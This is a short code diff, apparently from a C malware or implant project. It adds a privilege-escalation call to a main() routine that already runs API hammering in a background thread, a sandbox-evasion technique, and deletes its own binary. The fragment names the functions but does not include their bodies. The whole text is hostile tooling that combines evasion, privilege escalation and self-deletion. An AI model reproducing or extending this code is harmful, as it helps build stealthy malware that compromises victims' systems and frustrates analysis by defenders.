@@ -277,6 +277,11 @@ int main() {
 	}
 	printf("[+] Thread %d Was Created To Run ApiHammering In The Background\n", dwThreadId);
 
+	// Escalate the current process privileges
+	if (!DoPrivilegeEscalation()) {
+		printf("[!] Failed To Escalate Privileges \n");
+	}
+
 	//Delete the binary
 	if (!DeleteSelf()) {
 		printf("[!] Failed To Delete Self Binary \n");
